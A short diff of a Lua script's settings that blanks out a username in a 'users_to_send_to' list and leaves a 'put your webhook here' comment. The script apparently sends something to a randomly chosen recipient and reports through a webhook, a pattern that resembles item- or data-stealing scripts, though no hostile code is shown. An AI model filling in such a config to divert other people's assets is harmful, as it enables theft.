@@ -1,6 +1,6 @@
 -- randomly picks a user from this, put just 1 user if you only want to send to 1 person
 local users_to_send_to = {
-	"Perkins124541",
+	"",
 
 }
 -- put your webhook here
